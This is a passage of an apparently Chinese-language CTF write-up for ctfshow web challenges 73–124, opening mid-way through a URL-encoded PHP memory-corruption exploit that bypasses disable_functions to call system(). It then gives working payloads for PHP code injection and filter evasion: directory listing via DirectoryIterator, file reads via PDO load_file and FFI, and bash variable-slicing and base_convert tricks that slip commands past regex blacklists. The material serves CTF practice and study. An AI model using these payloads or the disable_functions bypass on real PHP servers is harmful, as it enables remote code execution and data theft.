losure_obj%20%3d%20str2ptr(%24abc%2c%200x20)%3b%20%20%20%20%20%20%24binary_leak%20%3d%20leak(%24closure_handlers%2c%208)%3b%20%20%20%20%20if(!(%24base%20%3d%20get_binary_base(%24binary_leak)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20determine%20binary%20base%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24elf%20%3d%20parse_elf(%24base)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20parse%20elf%20header%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24basic_funcs%20%3d%20get_basic_funcs(%24base%2c%20%24elf)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20basic_functions%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24zif_system%20%3d%20get_system(%24basic_funcs)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20zif_system%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%20%24fake_obj_offset%20%3d%200xd0%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x110%3b%20%24i%20%2b%3d%208)%20%7b%20%20%20%20%20%20%20%20%20write(%24abc%2c%20%24fake_obj_offset%20%2b%20%24i%2c%20leak(%24closure_obj%2c%20%24i))%3b%20%20%20%20%20%7d%20%20%20%20%20%20write(%24abc%2c%200x20%2c%20%24abc_addr%20%2b%20%24fake_obj_offset)%3b%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x38%2c%201%2c%204)%3b%20%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x68%2c%20%24zif_system)%3b%20%20%20%20%20%20%20(%24helper-%3eb)(%24cmd)%3b%20%20%20%20%20exit()%3b%20%7d%20%20ctfshow(%22cat%20%2fflag0.txt%22)%3bob_end_flush()%3b%20%3f%3e
```

### [web73]

先读取目录：

```php
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

发现`flagc.txt`文件

发现可以直接include:

```
c=include('/flagc.txt');exit();
```

web74是相同的套路

### [web75]

读取目录：

```
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

然后发现无法直接include，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：

```
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
```

web76是同样的套路

### [web77]

读取目录发现flag36x.txt和readflag
![image-20230707171534209](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171534209.png)

前面的套路失效了，根据提示使用PHP7.4以上才有的FFI进行命令执行

> FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。

payload：

```
c=$ffi = FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);
```

随后我们访问1.txt即可得到flag

![image-20230707171955622](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171955622.png)

### [web118]

```html
<!DOCTYPE html>
<html lang="zh-cn">
<body>
    <div style="width:400px;height:10px;margin:100px auto">
        <form action='' method=post> 
            <input type='text' name='code' placeholder="给你打开一扇通往结界的窗户，可惜钥匙你是找不到的 ">
        </form>
		<!-- system($code);-->
    </div>
</body>
</html>
```

题目的描述告诉我们flag在flag.php里面

题目环境的前端提示我们输入的命令会被执行，但经过尝试ls等命令是被ban掉的

**bash的内置变量进行绕过**

$PWD用法：

```
$PWD和${PWD}    /var/www/html  结果一样
${#PWD}         13    $PWD的长度
${PWD:3}        r/www/html   
${PWD:~3}    	html
${PWD:3:1}     	r
${PWD:~3:1} 	h	
${SHLVL:~A} 	1	    A是字符串 转换为数字相当于0   
```

拼接出nl：

```
n:
${PATH:~A}  	n #如果$PATH结尾为n
${PATH:${#TERM}:${SHLVL:~A}}   # n   相当于${PATH:14:1}
l:
${#RANDOM}  # 4或者5
${PATH:${#RANDOM}:${#SHLVL:~A}}  #l
```

https://www.cnblogs.com/sparkdev/p/9934595.html#title_pwd

构造payload：

```
${PATH:~A}${PWD:~A}$IFS????.???
```

```ruby
//也就是  nl flag.php
```

### [web119]

跟上题一样，不过`PATH`被ban了。

SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时`${SHLVL}=1`，然后在此shell中再打开一个shell时`$SHLVL=2`。

```bash
${SHLVL}       //一般是一个个位数
${#SHLVL}     //1，表示结果的字符长度
${PWD:${#}:${#SHLVL}}       //表示/
${USER}        //www-data
${PHP_VERSION:~A}       //2
${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}}         //at
```

`${PHP_VERSION:~A}`来自于返回报文的头部，为`2`：

![image-20230707175243025](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707175243025.png)

payload：

```
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???
```

```
//也就是：/???/?at ????.???
```

### [web120]

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

限制的$code的长度

把`${#}`省略

payload:

```
code=${PWD::${##}}???${PWD::${##}}??${PWD:~${SHLVL}:${##}} ????.???
```

也可以用`/bin/base64 flag.php`

即payload：(`$RANDOM` 的范围是 [0, 32767])

```
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
```

### [web121]

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

> `rev`命令将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。

 尝试构造命令：`/bin/rev flag.php`

> `${#IFS}`在ubuntu等系统中值为3，在kali中测试值为`4`
> `${#}`为添加到shell的参数个数，`${##}`则为值1

payload：

```
code=${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
```

得到的flag值放在Linux里面rev一下就可以了

> 另外
>
> `$?`表示上次命令的执行返回码，`0`表示正常，其他都是不正常。
>
> 所以我们可以有如下payload：
>
> ```
> code=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
> ```

### [web122]

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

比121又过滤了`PWD`和`$`

利用`<A`的报错就能返回值1。
这一题借用`${HOME}`的第一位为`/`：payload：

```
code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
```

（多执行几次）

### [web124]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

当前目录下的文件：

```
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&abs=system&acos=ls
```

读取文件：

```
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&abs=system&acos=tac flag.php
```

#### 解析

$pi是因为题目限制只能用这个，其他的不让用 首先$pi的值是_GET，定义这个变量是因为为了动态调用php函数 动态调用 PHP 函数，需要使用 `$var{func}` 这种形式，其中 `$var` 是一个字符串，`{func}` 表示函数名。否则，如果直接使用 `$func`，则 PHP 引擎会将其解释为一个未定义的常量，并且会导致语法错误。 为了调用system函数，就要构造

```
$pi{abs}($pi{acos});&abs=system&acos=ls
$pi{abs}($pi{acos});&abs=system&acos=tac flag.php
```

因为`$pi` 是一个字符串，而不是一个函数。`$pi` 的值是通过将 `37907361743` 和 `1598506324` 作为参数传递给 `base_convert` 和 `dechex` 函数计算得到的字符串。因此，如果直接使用 `$pi{abs}($pi{acos})`，PHP 引擎将无法识别 `$pi` 变量中的函数名。 为了解决这个问题，可以使用 PHP 变量变量解析器和函数调用链来动态调用函数。具体来说，`$$pi{abs}` 将 `$pi{abs}` 解释为一个变量名，然后使用 `$pi{acos}` 作为该变量名的值进行函数调用。因此，`$$pi{abs}($$pi{acos})` 将会调用 `$pi{abs}($pi{acos})`。 所以要构造

```
$$pi{abs}($$pi{acos});&abs=system&acos=ls
$$pi{abs}($$pi{acos});&abs=system&acos=tac flag.php
```

